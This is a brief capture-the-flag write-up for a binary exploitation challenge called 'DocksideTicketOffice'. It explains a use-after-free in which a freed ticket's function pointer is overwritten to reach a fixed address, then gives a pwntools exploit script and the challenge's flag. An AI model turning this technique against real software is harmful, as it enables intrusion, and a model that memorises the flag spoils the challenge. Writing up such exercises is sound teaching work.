---
title: "DocksideTicketOffice"
ctf: "CSSCTF"
date: 2026-09-30
category: pwn
flag_format: "CSSCTF{}"
---

`cancel_ticket` frees the `0x28`-byte ticket but leaves `active_ticket` pointing at it. `edit_ticket` then writes through that dangling pointer, letting us replace the function pointer at offset `0x20`. With no PIE, `open_gate` is at `0x40125f`.

Create and cancel a ticket, then overwrite the pointer and use the ticket:

```python
from pwn import *

io = process("./dockside_ticket")
io.recvuntil(b"> ")
io.sendline(b"1")
io.recvuntil(b"> ")
io.sendline(b"2")
io.recvuntil(b"> ")
io.sendline(b"3")
io.recvuntil(b"Enter new ticket data:")
io.send(b"A" * 0x20 + p64(0x40125f))
io.recvuntil(b"> ")
io.sendline(b"4")
print(io.recvall(timeout=2).decode(errors="replace"))
```

Flag:

```text
CSSCTF{us3_4ft3r_fr33_d0cks1d3}
```
